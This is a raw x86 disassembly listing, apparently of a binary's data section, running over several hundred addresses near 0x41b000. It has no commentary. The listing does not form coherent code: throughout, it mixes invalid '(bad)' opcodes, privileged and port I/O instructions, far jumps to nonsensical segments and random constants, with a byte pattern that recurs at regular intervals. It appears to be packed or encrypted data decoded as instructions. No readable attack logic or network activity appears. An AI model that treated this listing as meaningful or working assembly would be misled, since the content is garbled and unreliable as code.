  41b3b6:	fild   QWORD PTR [esi-0x518f529d]
  41b3bc:	mov    edi,ebx
  41b3be:	or     eax,0xbddf5baf
  41b3c3:	hlt    
  41b3c4:	jp     0x41b373
  41b3c6:	les    esi,FWORD PTR [eax-0x56a20f53]
  41b3cc:	shr    DWORD PTR [edi],1
  41b3ce:	pop    ss
  41b3cf:	mov    gs,ecx
  41b3d1:	jb     0x41b375
  41b3d3:	mov    esp,0x744e168b
  41b3d8:	pop    ebp
  41b3d9:	aas    
  41b3da:	and    al,0xe2
  41b3dc:	inc    esi
  41b3dd:	mov    eax,ds:0x6b87d572
  41b3e2:	pop    esp
  41b3e3:	xor    ebx,edi
  41b3e5:	mov    ebp,0xd92f7ce6
  41b3ea:	and    al,0x67
  41b3ec:	push   esi
	...
  41b455:	add    BYTE PTR [eax+0xd],cl
  41b458:	sbb    eax,0xfebb5dab
  41b45d:	out    dx,eax
  41b45e:	xchg   ebp,eax
  41b45f:	iret   
  41b460:	push   ebx
  41b461:	aas    
  41b462:	loope  0x41b46d
  41b464:	push   ebp
  41b465:	push   esi
  41b466:	sbb    DWORD PTR ds:0xff0001,esp
  41b46c:	add    BYTE PTR [eax],al
  41b46e:	xor    DWORD PTR [eax-0x25d05be6],edi
  41b474:	xchg   ebp,eax
  41b475:	adc    esi,DWORD PTR [eax+0x24d30ea]
  41b47b:	xor    eax,0x3528f98b
  41b480:	sub    bh,BYTE PTR [esi+0x42]
  41b483:	xor    BYTE PTR [ecx-0x7df453f1],dl
  41b489:	or     bl,BYTE PTR [ecx]
  41b48b:	push   0xffffffab
  41b48d:	push   eax
  41b48e:	cmc    
  41b48f:	out    dx,eax
  41b490:	xor    edi,esp
  41b492:	imul   ebp,DWORD PTR ds:0xbe77aae8,0xffffff9e
  41b499:	jl     0x41b49b
  41b49b:	icebp  
  41b49c:	mov    ecx,DWORD PTR [ebp+0x5cd5961]
  41b4a2:	(bad)  
  41b4a3:	dec    ebx
  41b4a4:	ds mov dl,0x6e
  41b4a7:	retf   
  41b4a8:	aas    
  41b4a9:	es or  al,al
  41b4ac:	and    ecx,DWORD PTR [ecx+0x17]
  41b4af:	jle    0x41b52e
  41b4b1:	push   esi
  41b4b2:	pop    edx
  41b4b3:	mov    ebx,0x58d1405c
  41b4b8:	xchg   BYTE PTR [edx-0x5a],ah
  41b4bb:	add    esp,ecx
  41b4bd:	into   
  41b4be:	int3   
  41b4bf:	shl    BYTE PTR [edi+0x727fd9c7],cl
  41b4c5:	data16 stc 
  41b4c7:	push   0xc9f07e7c
  41b4cc:	or     esp,DWORD PTR [eax+0x30]
  41b4cf:	test   DWORD PTR [eax+0xb326ab1],esp
  41b4d5:	and    ecx,ecx
  41b4d7:	fcomip st,st(1)
  41b4d9:	and    al,0x87
  41b4db:	add    BYTE PTR [edx+0x31b123d4],ah
  41b4e1:	add    dh,BYTE PTR [esi+0x69]
  41b4e4:	pop    es
  41b4e5:	dec    edx
  41b4e6:	test   eax,0x849cd23c
  41b4eb:	das    
  41b4ec:	add    bl,bh
  41b4ee:	(bad)  
  41b4ef:	fstp   DWORD PTR [edx]
  41b4f1:	inc    esi
  41b4f2:	push   esp
  41b4f3:	test   eax,0xd8d143b
  41b4f8:	inc    esi
  41b4f9:	push   cs
  41b4fa:	aam    0xdc
  41b4fc:	xchg   ecx,eax
  41b4fd:	int    0xd3
  41b4ff:	pop    edx
  41b500:	lds    ecx,FWORD PTR [eax]
  41b502:	lods   eax,DWORD PTR ds:[esi]
  41b503:	jb     0x41b4f4
  41b505:	in     al,dx
  41b506:	or     BYTE PTR [ebp+0x7a],ah
  41b509:	rol    DWORD PTR [edx+0x27],1
  41b50c:	jns    0x41b4e6
  41b50e:	sub    BYTE PTR [edx],bh
  41b510:	add    al,0x98
  41b512:	inc    esi
  41b513:	out    dx,eax
  41b514:	xor    al,0x90
  41b516:	add    DWORD PTR [edx],edi
  41b518:	inc    ebx
  41b519:	clc    
  41b51a:	jg     0x41b4b0
  41b51c:	and    bl,BYTE PTR [edi]
  41b51e:	push   esi
  41b51f:	rcr    DWORD PTR [edx+0x5e],1
  41b522:	sbb    eax,esi
  41b524:	jge    0x41b4f6
  41b526:	cmp    al,0x38
  41b528:	inc    ecx
  41b529:	xchg   edx,eax
  41b52a:	dec    edi
  41b52b:	add    DWORD PTR [esi+ebx*2],esi
  41b52e:	sbb    esi,DWORD PTR [ebp+0x7d]
  41b531:	hlt    
  41b532:	cdq    
  41b533:	mov    edx,DWORD PTR [edi]
  41b535:	iret   
  41b536:	ror    esi,cl
  41b538:	stc    
  41b539:	push   0x255e424b
  41b53e:	popf   
  41b53f:	add    DWORD PTR [ecx-0x4ab0549e],ebp
  41b545:	jnp    0x41b59c
  41b547:	mov    BYTE PTR [ecx],ah
  41b549:	mov    ecx,0x15835478
  41b54e:	gs ret 
  41b550:	push   es
  41b551:	xchg   esp,eax
  41b552:	push   eax
  41b553:	or     DWORD PTR [eax+0x6a8e578c],ebx
  41b559:	not    ebx
  41b55b:	(bad)  [eax]
  41b55d:	mov    al,BYTE PTR [esp+esi*2]
  41b560:	inc    esp
  41b561:	jle    0x41b4f0
  41b563:	dec    esi
  41b564:	sub    DWORD PTR [ebp-0x37071d92],edi
  41b56a:	popf   
  41b56b:	sub    DWORD PTR ds:0x0,edx
	...
  41b5d5:	add    ah,dl
  41b5d7:	in     al,dx
  41b5d8:	add    edi,edi
  41b5da:	cmp    edi,edi
  41b5dc:	(bad)  
  41b5dd:	out    dx,eax
  41b5de:	loope  0x41b5a6
  41b5e0:	jns    0x41b5c3
  41b5e2:	cldemote BYTE PTR [eax+0x126181f]
  41b5e9:	add    bh,bh
  41b5eb:	add    BYTE PTR [eax],al
  41b5ed:	add    BYTE PTR [ebp+0x35],cl
  41b5f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5f1:	lds    esi,FWORD PTR [esi+0x12]
  41b5f4:	fsubr  st,st(5)
  41b5f6:	repz mov dl,0x6e
  41b5f9:	(bad)  
  41b5fa:	xchg   ebp,eax
  41b5fb:	fldl2t 
  41b5fd:	xlat   BYTE PTR ds:[ebx]
  41b5fe:	mov    edi,0x91d3b782
  41b603:	retf   0x7a7b
  41b606:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b607:	push   0x6fea75b1
  41b60c:	push   ecx
  41b60d:	ins    BYTE PTR es:[edi],dx
  41b60e:	pop    edi
  41b60f:	mov    ds:0x9298452a,eax
  41b614:	adc    al,0x90
  41b616:	dec    edi
  41b617:	pop    esp
  41b618:	mov    al,ds:0xf0807c0d
  41b61d:	mov    dl,0x84
  41b61f:	push   0xffffff93
  41b621:	mov    ebp,0x31fd66cf
  41b626:	and    al,0xca
  41b628:	fnstenv [edi+0x482b50c]
  41b62e:	sti    
  41b62f:	mov    ecx,0x83c06d25
  41b634:	or     eax,0x412558bb
  41b639:	dec    edi
  41b63a:	and    BYTE PTR [ecx],0x83
  41b63d:	mov    eax,ds:0x1baf5999
  41b642:	jp     0x41b5e2
  41b644:	push   es
  41b645:	hlt    
  41b646:	add    DWORD PTR ds:0x9b464739,edi
  41b64c:	xor    dl,ch
  41b64e:	imul   DWORD PTR [edx-0xe56d254]
  41b654:	dec    esp
  41b655:	pop    esi
  41b656:	pop    es
  41b657:	mov    al,ds:0xe2f916d3
  41b65c:	adc    ebp,esi
  41b65e:	cmp    ah,cl
  41b660:	jae    0x41b609
  41b662:	fsubrp st(3),st
  41b664:	jmp    0x6553:0xa78a5f09
  41b66b:	jle    0x41b622
  41b66d:	and    eax,0x534d7d99
  41b672:	mov    cl,0xdf
  41b674:	test   ch,dl
  41b676:	enter  0x4cf7,0x6d
  41b67a:	inc    edi
  41b67b:	iret   
  41b67c:	push   es
  41b67d:	xchg   esp,eax
  41b67e:	adc    al,0x75
  41b680:	jns    0x41b63b
  41b682:	xchg   esi,eax
  41b683:	push   esp
  41b684:	mov    eax,ds:0xdfa61ed6
  41b689:	test   DWORD PTR [edx-0x45],esp
  41b68c:	cmp    eax,0xd43661b2
  41b691:	xlat   BYTE PTR ds:[ebx]
  41b692:	and    edx,edi
  41b694:	aaa    
  41b695:	repnz cmp al,0x65
  41b698:	aas    
  41b699:	repz adc al,0xc0
  41b69c:	mov    WORD PTR [ebp-0x38],es
  41b69f:	or     al,0xe4
  41b6a1:	mov    eax,0xa34fa485
  41b6a6:	test   DWORD PTR [edi],0xb60c064b
  41b6ac:	into   
  41b6ad:	jge    0x41b6b0
  41b6af:	out    dx,al
  41b6b0:	lods   eax,DWORD PTR ds:[esi]
  41b6b1:	sub    DWORD PTR [eax],edi
  41b6b3:	push   ecx
  41b6b4:	test   DWORD PTR [ebx],ebp
  41b6b6:	cmp    BYTE PTR [ebx-0x6],0x5a
  41b6ba:	sub    DWORD PTR [eax],0xb5694d19
  41b6c0:	mov    dl,0x5b
  41b6c2:	dec    esi
  41b6c3:	xor    eax,0x8981909
  41b6c8:	pusha  
  41b6c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6ca:	or     al,0x6c
  41b6cc:	add    ebp,DWORD PTR [edi+0x13]
  41b6cf:	push   esi
  41b6d0:	retf   0x5e22
  41b6d3:	test   BYTE PTR [esi+0x2f],dl
  41b6d6:	clc    
  41b6d7:	mov    cl,BYTE PTR [bx]
  41b6da:	aam    0xdc
  41b6dc:	daa    
  41b6dd:	jmp    FWORD PTR [edi+0x69]
  41b6e0:	cmp    ch,ch
  41b6e2:	rcr    DWORD PTR [esi-0xb42d711],1
  41b6e8:	outs   dx,BYTE PTR ds:[esi]
  41b6e9:	and    esp,DWORD PTR [esp+edi*4-0x25]
	...
  41b755:	add    BYTE PTR [eax-0x2469e49d],ch
  41b75b:	(bad)  
  41b75c:	lods   eax,DWORD PTR ds:[esi]
  41b75d:	jg     0x41b75a
  41b75f:	push   ds
  41b760:	mov    ah,dh
  41b762:	test   bh,dl
  41b764:	nop
  41b765:	stc    
  41b766:	pop    ss
  41b767:	daa    
  41b768:	add    DWORD PTR [eax],eax
  41b76a:	inc    DWORD PTR [eax]
  41b76c:	add    BYTE PTR [eax],al
  41b76e:	adc    bl,0x45
  41b771:	rol    ebx,1
  41b773:	repnz ins DWORD PTR es:[edi],dx
  41b775:	imul   edx,DWORD PTR [esi+0x5009d7c7],0x503c63dd
  41b77f:	shr    BYTE PTR [eax],cl
  41b781:	mov    esp,0x79c6c9d8
  41b786:	fwait
  41b787:	cdq    
  41b788:	dec    esp
  41b789:	xchg   esi,eax
  41b78a:	push   ds
  41b78b:	add    al,0xf1
  41b78d:	inc    edi
  41b78e:	fucomp st(2)
  41b790:	imul   ebp,DWORD PTR [edi],0x3c0f72b8
  41b796:	adc    BYTE PTR [esi-0x7df2212e],0xd7
  41b79d:	out    0x86,al
  41b79f:	test   al,0x70
  41b7a1:	pushf  
  41b7a2:	sbb    BYTE PTR [esi],ah
  41b7a4:	mov    ch,0x4f
  41b7a6:	xor    BYTE PTR ds:[ebx+0x74d888c7],ah
  41b7ad:	jmp    0xc0e95b92
  41b7b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7b3:	call   0x6091:0xc0fae051
  41b7ba:	xor    al,0xa2
  41b7bc:	mov    es,WORD PTR [edi-0x37]
  41b7bf:	mov    dl,0x63
  41b7c1:	and    al,0x19
  41b7c3:	sub    DWORD PTR [esi+0x45],0xffffffb5
  41b7c7:	and    esi,DWORD PTR [edx]
  41b7c9:	jl     0x41b74b
  41b7cb:	cmp    BYTE PTR [ebx+0x22],ah
  41b7ce:	popa   
  41b7cf:	mov    WORD PTR [ebp+ecx*8+0x32],ss
  41b7d3:	sbb    eax,0x4ae2c273
  41b7d8:	and    BYTE PTR [ecx],bl
  41b7da:	sub    DWORD PTR [esi-0x12],ecx
  41b7dd:	aas    
  41b7de:	or     DWORD PTR [edx+0x78bd5206],ecx
  41b7e4:	loope  0x41b845
  41b7e6:	and    edi,DWORD PTR [ecx-0x305f2b93]
  41b7ec:	push   esp
  41b7ed:	pop    ss
  41b7ee:	js     0x41b85b
  41b7f0:	ror    esp,0x10
  41b7f3:	les    eax,FWORD PTR [esi]
  41b7f5:	push   0x3e
  41b7f7:	push   0xfffffff9
  41b7f9:	loopne 0x41b784
  41b7fb:	out    0x6d,al
  41b7fd:	inc    edi
  41b7fe:	and    DWORD PTR [esi-0x5cae7e41],esi
  41b804:	fldcw  WORD PTR [edx-0x54]
  41b807:	(bad)  
  41b808:	out    0xb6,al
  41b80a:	and    DWORD PTR [eax],eax
  41b80c:	or     ecx,DWORD PTR [ecx+0x75]
  41b80f:	jp     0x41b881
  41b811:	add    eax,DWORD PTR [ebx+0x24]
  41b814:	daa    
  41b815:	pop    ss
  41b816:	stos   DWORD PTR es:[edi],eax
  41b817:	addr16 push ss
  41b819:	sbb    BYTE PTR [ebp-0x59a5677e],0x45
  41b820:	jne    0x41b7a6
  41b822:	xor    eax,0x687ac2b9
  41b827:	push   eax
  41b828:	mov    bh,0xf7
  41b82a:	mov    ds:0xe3491222,al
  41b82f:	stc    
  41b830:	pop    ecx
  41b831:	test   edx,esp
  41b833:	push   es
  41b834:	add    BYTE PTR [edx],ch
  41b836:	jmp    0x4a784deb
  41b83b:	sub    DWORD PTR [edx],0x1b
  41b83e:	mov    eax,0xd2defdb5
  41b843:	daa    
  41b844:	jbe    0x41b7d9
  41b846:	cmp    BYTE PTR [esi],al
  41b848:	sub    BYTE PTR [edx-0x7c],dh
  41b84b:	push   eax
  41b84c:	lods   eax,DWORD PTR ds:[esi]
  41b84d:	jo     0x41b8a5
  41b84f:	or     eax,0x69de8385
  41b854:	and    eax,0x6a304ad1
  41b859:	nop
  41b85a:	sub    DWORD PTR [edi+0x34114fcb],ecx
  41b860:	push   ss
  41b861:	mov    edi,0x24882efb
  41b866:	xor    ch,BYTE PTR [edx-0x72cb40af]
  41b86c:	jne    0x41b86e
	...
  41b8d6:	mov    bh,ah
  41b8d8:	(bad)  
  41b8d9:	dec    esi
  41b8da:	idiv   DWORD PTR [edi-0x75]
  41b8dd:	cld    
  41b8de:	ret    0x78e3
  41b8e1:	add    al,0xd4
  41b8e3:	mov    ds:0x28162b95,eax
  41b8e8:	add    DWORD PTR [eax],eax
  41b8ea:	inc    DWORD PTR [eax]
  41b8ec:	add    BYTE PTR [eax],al
  41b8ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8ef:	sub    eax,0x2dd0b998
  41b8f4:	lahf   
  41b8f5:	add    eax,0x90ff8fda
  41b8fa:	sbb    eax,0xa7308d3c
  41b8ff:	hlt    
  41b900:	mov    eax,0x97dd54e7
  41b905:	lds    esi,FWORD PTR [ecx-0x27]
  41b908:	std    
  41b909:	sbb    al,0xa0
  41b90b:	inc    esi
  41b90c:	mov    ch,0xb3
  41b90e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b90f:	ds js  0x41b914
  41b912:	mov    ds:0xd53c4853,al
  41b917:	pop    edi
  41b918:	mov    ecx,edi
  41b91a:	(bad)  
  41b91b:	ins    DWORD PTR es:[edi],dx
  41b91c:	ret    
  41b91d:	lea    ebx,[ebx+0xf]
  41b920:	pop    ecx
  41b921:	repnz out dx,eax
  41b923:	fsub   QWORD PTR [ebp-0x78646c4]
  41b929:	sub    DWORD PTR [ebx-0x1e3f96df],ecx
  41b92f:	pop    ebx
  41b930:	sub    al,0x2a
  41b932:	add    BYTE PTR [edx],bl
  41b934:	retf   
  41b935:	fsubr  QWORD PTR [ebx]
  41b937:	lods   al,BYTE PTR ds:[esi]
  41b938:	aaa    
  41b939:	push   esi
  41b93a:	aaa    
  41b93b:	rcr    DWORD PTR [eax],1
  41b93d:	popf   
  41b93e:	add    ah,BYTE PTR [esp+edi*4+0x2dc75463]
  41b945:	into   
  41b946:	cld    
  41b947:	xchg   esp,eax
  41b948:	pop    es
  41b949:	pop    ds
  41b94a:	adc    DWORD PTR [ebp-0x10],esi
  41b94d:	add    al,0xf7
  41b94f:	sbb    DWORD PTR [esi],0x37c120ce
  41b955:	iret   
  41b956:	sub    esp,DWORD PTR [edx+0x3c889fa1]
  41b95c:	and    BYTE PTR [edi-0x7d4992bb],0x8
  41b963:	inc    esi
  41b964:	cld    
  41b965:	pushf  
  41b966:	sbb    al,0x19
  41b968:	loopne 0x41b9c9
  41b96a:	stos   DWORD PTR es:[edi],eax
  41b96b:	shr    DWORD PTR [ebx+0x11],cl
  41b96e:	and    eax,0xb274c444
  41b973:	fsub   QWORD PTR [ebx]
  41b975:	pop    edx
  41b976:	stos   DWORD PTR es:[edi],eax
  41b977:	push   esp
  41b978:	xor    al,0x2c
  41b97a:	cmp    ah,BYTE PTR [eax+0x7ef44f5d]
  41b980:	out    dx,eax
  41b981:	bound  esp,QWORD PTR [edi]
  41b983:	adc    cl,al
  41b985:	jmp    0xbbad36a8
  41b98a:	mov    WORD PTR [eax+edx*2+0x3d],gs
  41b98e:	in     al,0x66
  41b990:	imul   edx,DWORD PTR [edx-0x1a],0x2ade3be3
  41b997:	shl    DWORD PTR [ebp+0x1ba778d1],1
  41b99d:	cs aad 0xb0
  41b9a0:	or     al,0xaa
  41b9a2:	pop    edi
  41b9a3:	in     eax,0x30
  41b9a5:	mov    eax,0xe9b0269c
  41b9aa:	inc    edi
  41b9ab:	out    dx,al
  41b9ac:	xor    ah,ch
  41b9ae:	scas   al,BYTE PTR es:[edi]
  41b9af:	sti    
  41b9b0:	rol    BYTE PTR [ebp-0x5b],0xe7
  41b9b4:	iret   
  41b9b5:	bound  esi,QWORD PTR [ecx]
  41b9b7:	pop    edx
  41b9b8:	mov    ss,ecx
  41b9ba:	test   ah,cl
  41b9bc:	push   eax
  41b9bd:	push   esi
  41b9be:	sbb    BYTE PTR [esi+ecx*4],0xc6
  41b9c2:	xor    eax,0xc7f163c
  41b9c7:	(bad)  
  41b9c8:	lea    edi,[esi-0x7d]
  41b9cb:	test   al,0x4
  41b9cd:	xchg   edx,eax
  41b9ce:	mov    edx,0xdce9fb42
  41b9d3:	inc    ebp
  41b9d4:	xchg   esp,eax
  41b9d5:	ss mov esp,0x2f33e554
  41b9db:	xlat   BYTE PTR ds:[ebx]
  41b9dc:	jp     0x41ba0b
  41b9de:	in     al,dx
  41b9df:	and    BYTE PTR [edi],dh
  41b9e1:	aam    0x6
  41b9e3:	inc    esi
  41b9e4:	mov    ds,ebp
  41b9e6:	cs inc eax
  41b9e8:	sbb    dl,0xc6
  41b9eb:	stc    
  41b9ec:	jnp    0x41b9ee
	...
  41ba56:	ret    
  41ba57:	mov    esp,0xf87f4844
  41ba5c:	iret   
  41ba5d:	mov    edi,0x8c8b3b8c
  41ba62:	(bad)  
  41ba63:	js     0x41ba37
  41ba65:	mov    dh,0x15
  41ba67:	sub    DWORD PTR [ecx],eax
  41ba69:	add    bh,bh
  41ba6b:	add    BYTE PTR [eax],al
  41ba6d:	add    BYTE PTR [eax-0x4b],bh
  41ba70:	in     eax,0x9e
  41ba72:	js     0x41ba05
  41ba74:	jbe    0x41baa7
  41ba76:	call   0xa669:0xa973da69
  41ba7d:	aam    0x3b
  41ba7f:	mov    al,ds:0xc4508a11
  41ba84:	lahf   
  41ba85:	ficomp DWORD PTR [ebx-0x4606c312]
  41ba8b:	gs mov al,0x10
  41ba8e:	jae    0x41ba7e
  41ba90:	sbb    edx,DWORD PTR [edi+0x6f021367]
  41ba96:	or     cl,BYTE PTR [ecx+0x2715c2e1]
  41ba9c:	lock cld 
  41ba9e:	and    DWORD PTR [esp+eax*1+0x27],esi
  41baa2:	xchg   esi,eax
  41baa3:	push   ebx
  41baa4:	aaa    
  41baa5:	mov    edx,0x2cc2d6cf
  41baaa:	loopne 0x41ba73
  41baac:	dec    esp
  41baad:	xrelease xchg DWORD PTR [ebx],ebp
  41bab0:	jno    0x41bb02
  41bab2:	sub    dl,BYTE PTR [ecx+0x68]
  41bab5:	mov    WORD PTR [edx],?
  41bab7:	mov    edi,0xbbf74eff
  41babc:	jp     0x41bb3b
  41babe:	cdq    
  41babf:	push   ss
  41bac0:	mov    eax,0x3796279c
  41bac5:	pop    esi
  41bac6:	nop
  41bac7:	ins    BYTE PTR es:[edi],dx
  41bac8:	lods   al,BYTE PTR ds:[esi]
  41bac9:	sub    al,0xb9
  41bacb:	mov    edx,0xd3622a50
  41bad0:	xchg   edi,eax
  41bad1:	scas   al,BYTE PTR es:[edi]
  41bad2:	pop    eax
  41bad3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bad4:	or     BYTE PTR [eax-0x36],ah
  41bad7:	rcl    BYTE PTR gs:[ecx-0x705e3351],cl
  41bade:	sub    dl,bl
  41bae0:	repnz and ebp,DWORD PTR [edi]
  41bae3:	sbb    eax,0x17b6f11e
  41bae8:	mov    edx,0x476f175c
  41baed:	xor    eax,0x1efe7673
  41baf2:	add    eax,0xddf68aa1
  41baf7:	cmp    DWORD PTR [edi+esi*8+0x13ffe5ad],ecx
  41bafe:	add    BYTE PTR [edx+0x19],bh
  41bb01:	jp     0x41ba8e
  41bb03:	xchg   ebx,eax
  41bb04:	out    dx,al
  41bb05:	inc    eax
  41bb06:	push   edi
  41bb07:	(bad)  
  41bb08:	loope  0x41bae7
  41bb0a:	ret    0xab
  41bb0d:	and    WORD PTR ds:0x4299f187,bp
  41bb14:	int3   
  41bb15:	int3   
  41bb16:	xlat   BYTE PTR ds:[ebx]
  41bb17:	scas   eax,DWORD PTR es:[edi]
  41bb18:	shl    DWORD PTR [edx-0x3a],0x9
  41bb1c:	lods   eax,DWORD PTR ss:[esi]
  41bb1e:	pop    ss
  41bb1f:	fucomip st,st(2)
  41bb21:	mov    ds:0x59fc1b7,al
  41bb26:	mov    ebp,0xfe4d66bb
  41bb2b:	outs   dx,BYTE PTR ds:[esi]
  41bb2c:	fisubr WORD PTR ds:0x8aa01766
  41bb32:	jmp    0x84b72e9b
  41bb37:	ss ret 0x9fe
  41bb3b:	jne    0x41bb9b
  41bb3d:	mov    bh,0xcc
  41bb3f:	sbb    ecx,DWORD PTR [esi+0x3d]
  41bb42:	pop    eax
  41bb43:	into   
  41bb44:	jle    0x41bb54
  41bb46:	pop    es
  41bb47:	mov    WORD PTR [edx-0x6e9b7aa7],?
  41bb4d:	aas    
  41bb4e:	aad    0x6c
  41bb50:	(bad)  
  41bb51:	popf   
  41bb52:	jge    0x41bb55
  41bb54:	inc    edx
  41bb55:	aas    
  41bb56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb57:	fdiv   QWORD PTR [eax+0xbf966a8]
  41bb5d:	add    bl,BYTE PTR [esi-0x51c57db3]
  41bb63:	mov    ch,0xcc
  41bb65:	test   eax,0xfcb89dc3
  41bb6a:	call   0x0:0x55de
	...
  41bbd5:	add    BYTE PTR [edx],cl
  41bbd7:	mov    eax,0xbfb7aaa5
  41bbdc:	(bad)  
  41bbde:	jg     0x41bbe5
  41bbe0:	arpl   WORD PTR [edi-0x6a],cx
  41bbe3:	das    
  41bbe4:	pushf  
  41bbe5:	cld    
  41bbe6:	adc    al,0x2a
  41bbe8:	add    DWORD PTR [eax],eax
  41bbea:	inc    DWORD PTR [eax]
  41bbec:	add    BYTE PTR [eax],al
  41bbee:	xor    cl,cl
  41bbf0:	mov    al,dh
  41bbf2:	xchg   edi,eax
  41bbf3:	xchg   BYTE PTR [edi-0x67],ah
  41bbf6:	pop    edx
  41bbf7:	xor    dh,al
  41bbf9:	or     DWORD PTR [ecx],edi
  41bbfb:	adc    esi,DWORD PTR [ecx+0x4c16109a]
  41bc01:	mov    bh,0x2
  41bc03:	ins    DWORD PTR es:[edi],dx
  41bc04:	mov    edi,0xc895b2aa
  41bc09:	mov    edx,ds
  41bc0b:	adc    BYTE PTR [ebp+0x28746bb6],al
  41bc11:	shr    DWORD PTR [ecx],0xad
  41bc14:	jno    0x41bc02
  41bc16:	out    0x5f,al
  41bc18:	sbb    al,0x7e
  41bc1a:	push   ds
  41bc1b:	repz int 0xe4
  41bc1e:	test   BYTE PTR [esi+0x337dc511],cl
  41bc24:	push   ecx
  41bc25:	ins    BYTE PTR es:[edi],dx
  41bc26:	mov    al,ds:0xb30dcfdc
  41bc2b:	pusha  
  41bc2c:	xor    ebp,DWORD PTR [edi-0xa]
  41bc2f:	or     esp,DWORD PTR cs:[ebx]
  41bc32:	push   ebx
  41bc33:	inc    ecx
  41bc34:	cvtdq2ps xmm7,xmm6
  41bc37:	enter  0x6c60,0x5f
  41bc3b:	xor    bh,BYTE PTR [edx+0x6e]
  41bc3e:	and    BYTE PTR [esi],cl
  41bc40:	int    0xb9
  41bc42:	dec    ebx
  41bc43:	add    eax,0x650228a5
  41bc48:	out    dx,eax
  41bc49:	and    eax,0x51a8c4f2
  41bc4e:	push   esp
  41bc4f:	(bad)  
  41bc50:	mov    ebx,0x4108033f
  41bc55:	pusha  
  41bc56:	mov    al,0xa2
  41bc58:	and    al,0x5f
  41bc5a:	push   esi
  41bc5b:	enter  0xee1f,0xb9
  41bc5f:	cdq    
  41bc60:	jmp    0x79d4:0x54415a8c
  41bc67:	push   ds
  41bc68:	xchg   ecx,eax
  41bc69:	xor    dh,BYTE PTR [ebx]
  41bc6b:	pop    ebx
  41bc6c:	cmp    al,0x60
  41bc6f:	push   edx
  41bc70:	scas   al,BYTE PTR es:[edi]
  41bc71:	xchg   esi,eax
  41bc72:	push   ebx
  41bc73:	fdivr  st(5),st
  41bc75:	in     eax,0xbc
  41bc77:	test   BYTE PTR [esi-0x2fb8316c],dl
  41bc7d:	loopne 0x41bcb1
  41bc7f:	popf   
  41bc80:	or     al,0xe8
  41bc82:	and    DWORD PTR [ecx],0x67
  41bc85:	jb     0x41bc12
  41bc87:	cmp    BYTE PTR [edx-0x6f2f7269],dl
  41bc8d:	cmp    eax,0xd00d472a
  41bc92:	mov    bl,0x8d
  41bc94:	call   0xc8dc5e7a
  41bc99:	xlat   BYTE PTR ds:[ebx]
  41bc9a:	mov    ebp,DWORD PTR [ecx-0x28]
  41bc9d:	inc    esp
  41bc9e:	cwde   
  41bc9f:	xor    al,0x59
  41bca1:	outs   dx,DWORD PTR ds:[esi]
  41bca2:	inc    edx
  41bca3:	mov    esp,0x5740f04f
  41bca8:	imul   esp,DWORD PTR ds:0xa329efff,0xddd45358
  41bcb2:	adc    edi,DWORD PTR [edi+0x4a]
  41bcb5:	aas    
  41bcb6:	retf   0x8154
  41bcb9:	jno    0x41bd37
  41bcbb:	popf   
  41bcbc:	jl     0x41bc5d
  41bcbe:	test   al,dh
  41bcc0:	ror    DWORD PTR [ebx+0x75a6b7b7],0xcf
  41bcc7:	jmp    0x41bd43
  41bcc9:	imul   ecx
  41bccb:	mov    ecx,0xe91d00f1
  41bcd0:	retf   
  41bcd1:	test   BYTE PTR [edx+eiz*1-0x7e],bl
  41bcd5:	jl     0x41bc96
  41bcd7:	add    al,0x95
  41bcd9:	fld    QWORD PTR [edx+0x7765a0c5]
  41bcdf:	pop    ebp
  41bce0:	xchg   esi,eax
  41bce1:	imul   edi,DWORD PTR [eax],0x45
  41bce4:	stos   BYTE PTR es:[edi],al
  41bce5:	adc    dh,ch
  41bce7:	adc    al,0xfa
  41bce9:	push   edi
  41bcea:	ins    BYTE PTR es:[edi],dx
  41bceb:	aad    0xc7
	...
  41bd55:	add    dl,dl
  41bd57:	xor    bh,dl
  41bd59:	clc    
  41bd5a:	cli    
  41bd5b:	clc    
  41bd5c:	sar    BYTE PTR [edx],cl
  41bd5e:	sti    
  41bd5f:	mov    ebp,0xecd3d9d8
  41bd64:	and    al,0x63
  41bd66:	adc    ebp,DWORD PTR [ebx]
  41bd68:	add    DWORD PTR [eax],eax
  41bd6a:	inc    DWORD PTR [eax]
  41bd6c:	add    BYTE PTR [eax],al
  41bd6e:	dec    esi
  41bd6f:	in     eax,dx
  41bd70:	adc    BYTE PTR [edx-0x2dfeb5f2],dh
  41bd76:	mov    edi,0x8e52890f
  41bd7b:	pop    ebp
  41bd7c:	fild   QWORD PTR [ecx+esi*2+0x42]
  41bd80:	ret    
  41bd81:	shr    DWORD PTR [edi],0x62
  41bd84:	push   ds
  41bd85:	div    eax
  41bd87:	test   DWORD PTR [esi+0x6f9a18c8],eax
  41bd8d:	pop    edi
  41bd8e:	add    bh,ch
  41bd90:	push   ebp
  41bd91:	mov    ds,WORD PTR [ecx-0x5cc7081]
  41bd97:	mov    edi,0x1e3d5e6
  41bd9c:	test   cl,bl
  41bd9e:	dec    eax
  41bd9f:	pop    ebx
  41bda0:	or     BYTE PTR [eax-0x7bdca6fd],bl
  41bda6:	sub    DWORD PTR [eax-0x14],esp
  41bda9:	dec    DWORD PTR [edi+0x57]
  41bdac:	fdiv   DWORD PTR [edi+esi*4+0x35]
  41bdb0:	dec    esi
  41bdb1:	xchg   esp,eax
  41bdb2:	fldcw  WORD PTR [edi+edx*8]
  41bdb5:	push   0x4e
  41bdb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bdb8:	out    0x35,al
  41bdba:	jo     0x41bd80
  41bdbc:	pop    ds
  41bdbd:	hlt    
  41bdbe:	inc    edi
  41bdbf:	test   al,0x21
  41bdc1:	add    al,0x85
  41bdc3:	outs   dx,DWORD PTR ds:[esi]
  41bdc4:	xchg   ecx,eax
  41bdc5:	sti    
  41bdc6:	es jb  0x41bddf
  41bdc9:	dec    edx
  41bdca:	fcomp  DWORD PTR [edx+eax*4+0x1eebdbe0]
  41bdd1:	jp     0x41be0c
  41bdd3:	ret    
  41bdd4:	inc    ebx
  41bdd5:	imul   edx,DWORD PTR [ecx],0x67a8abc5
  41bddb:	inc    ebp
  41bddc:	mov    cl,0x89
  41bdde:	rcr    edi,0x5
  41bde1:	xchg   ecx,eax
  41bde2:	sub    al,0xa4
